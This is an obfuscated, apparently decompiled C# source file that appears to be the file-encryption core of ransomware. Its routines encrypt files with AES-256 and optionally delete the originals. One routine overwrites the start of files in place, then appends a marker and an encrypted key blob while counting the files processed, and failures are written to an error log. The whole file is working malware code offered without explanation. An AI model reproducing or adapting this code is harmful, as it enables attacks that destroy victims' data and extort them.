using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace dfbDZtGQEYGzK;

public static class rXGCpkRzmuovpDl
{
	public const int saDUSqifuwwR = 256;

	public static byte[] tbpRiaPUZxvTRmJ(int dVfvYopufDZcpPOK)
	{
		byte[] array = new byte[dVfvYopufDZcpPOK];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool zYXyLtVHFp(string tlebWtzqwab, byte[] kfZCIBPhHApmYXLv, bool ydfbKmWgWMA)
	{
		byte[] array = tbpRiaPUZxvTRmJ(16);
		using FileStream fileStream = new FileStream(tlebWtzqwab + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = gWQkFwFQGgx(kfZCIBPhHApmYXLv, array);
		kfZCIBPhHApmYXLv = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(tlebWtzqwab, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (ydfbKmWgWMA)
			{
				File.Delete(tlebWtzqwab);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool SAzCLsderARi(string YjblOyQbFPF, byte[] mVqGEYotfnWNi, bool HbAkABbHVjjsb)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(YjblOyQbFPF, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = gWQkFwFQGgx(mVqGEYotfnWNi, array);
		mVqGEYotfnWNi = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(YjblOyQbFPF.Remove(YjblOyQbFPF.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] iCldzZsGXm(byte[] SwKyujrfiYVm, byte[] yWkBJaFHLem, byte[] WFXDZUQJCuH)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = gWQkFwFQGgx(yWkBJaFHLem, WFXDZUQJCuH);
		yWkBJaFHLem = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(SwKyujrfiYVm, 0, SwKyujrfiYVm.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] zJrvQKScnyX(byte[] gwizJIISyb, byte[] PyQIAwgEDjw, byte[] rFDMvMVsZFDuE)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = gWQkFwFQGgx(PyQIAwgEDjw, rFDMvMVsZFDuE);
		PyQIAwgEDjw = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(gwizJIISyb, 0, gwizJIISyb.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool ziGtqlDZaBiIc(byte[] GtxHAtXZXJ, byte[] LCYnQEHTljt, byte[] uefFTbchwGYA)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = gWQkFwFQGgx(GtxHAtXZXJ, LCYnQEHTljt);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(uefFTbchwGYA);
	}

	public static Rfc2898DeriveBytes gWQkFwFQGgx(byte[] rhhPlfrkidzd, byte[] gKcimcnPaUsQZ)
	{
		return new Rfc2898DeriveBytes(rhhPlfrkidzd, gKcimcnPaUsQZ, 52768);
	}

	public static byte[] ixVmRqpXGZeT(string YXVAWRIpwsSxZQn, int VagabOunvP)
	{
		byte[] array = new byte[VagabOunvP];
		try
		{
			if (sWSXzQkxHH.plYUDCqFaSkhDF == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(YXVAWRIpwsSxZQn, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, VagabOunvP);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(YXVAWRIpwsSxZQn, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, VagabOunvP);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (sWSXzQkxHH.bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(sWSXzQkxHH.SlCyjezmzcjRF, "File: " + YXVAWRIpwsSxZQn + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(YXVAWRIpwsSxZQn, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, VagabOunvP);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool lXlBZHvZpzmZ(string gxtHysuevYkPA, byte[] hNucWYcpei, byte[] kefvkXQNqnLAH = null)
	{
		try
		{
			byte[] array = null;
			if (sWSXzQkxHH.plYUDCqFaSkhDF == "YES")
			{
				array = (sWSXzQkxHH.QHRYFfpHvmAnP ? Encoding.ASCII.GetBytes(sWSXzQkxHH.agZtqMkMayfivgE(sWSXzQkxHH.EyQuTisxzdRHp) + sWSXzQkxHH.agZtqMkMayfivgE("Kw==") + Convert.ToString(sWSXzQkxHH.OonNbDeTktyi) + sWSXzQkxHH.agZtqMkMayfivgE("Kw==")) : Encoding.ASCII.GetBytes(sWSXzQkxHH.agZtqMkMayfivgE(sWSXzQkxHH.EyQuTisxzdRHp) + sWSXzQkxHH.agZtqMkMayfivgE("LQ==") + Convert.ToString(sWSXzQkxHH.OonNbDeTktyi) + sWSXzQkxHH.agZtqMkMayfivgE("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(gxtHysuevYkPA, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(hNucWYcpei, 0, hNucWYcpei.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(gxtHysuevYkPA, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!sWSXzQkxHH.QHRYFfpHvmAnP)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(kefvkXQNqnLAH, 0, kefvkXQNqnLAH.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (sWSXzQkxHH.QHRYFfpHvmAnP ? Encoding.ASCII.GetBytes(sWSXzQkxHH.agZtqMkMayfivgE(sWSXzQkxHH.EyQuTisxzdRHp) + sWSXzQkxHH.agZtqMkMayfivgE("Kw==") + Convert.ToString(sWSXzQkxHH.OonNbDeTktyi) + sWSXzQkxHH.agZtqMkMayfivgE("Kw==")) : Encoding.ASCII.GetBytes(sWSXzQkxHH.agZtqMkMayfivgE(sWSXzQkxHH.EyQuTisxzdRHp) + sWSXzQkxHH.agZtqMkMayfivgE("LQ==") + Convert.ToString(sWSXzQkxHH.OonNbDeTktyi) + sWSXzQkxHH.agZtqMkMayfivgE("LQ==")));
				FileStream fileStream2 = new FileStream(gxtHysuevYkPA, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(hNucWYcpei, 0, hNucWYcpei.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(gxtHysuevYkPA, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!sWSXzQkxHH.QHRYFfpHvmAnP)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(kefvkXQNqnLAH, 0, kefvkXQNqnLAH.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			sWSXzQkxHH.lerIQIfDMA++;
		}
		catch (Exception ex)
		{
			if (sWSXzQkxHH.bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(sWSXzQkxHH.SlCyjezmzcjRF, "File: " + gxtHysuevYkPA + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (sWSXzQkxHH.QHRYFfpHvmAnP ? Encoding.ASCII.GetBytes(sWSXzQkxHH.agZtqMkMayfivgE(sWSXzQkxHH.EyQuTisxzdRHp) + sWSXzQkxHH.agZtqMkMayfivgE("Kw==") + Convert.ToString(sWSXzQkxHH.OonNbDeTktyi) + sWSXzQkxHH.agZtqMkMayfivgE("Kw==")) : Encoding.ASCII.GetBytes(sWSXzQkxHH.agZtqMkMayfivgE(sWSXzQkxHH.EyQuTisxzdRHp) + sWSXzQkxHH.agZtqMkMayfivgE("LQ==") + Convert.ToString(sWSXzQkxHH.OonNbDeTktyi) + sWSXzQkxHH.agZtqMkMayfivgE("LQ==")));
				FileStream fileStream4 = new FileStream(gxtHysuevYkPA, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(hNucWYcpei, 0, hNucWYcpei.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(gxtHysuevYkPA, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!sWSXzQkxHH.QHRYFfpHvmAnP)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(kefvkXQNqnLAH, 0, kefvkXQNqnLAH.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}
}
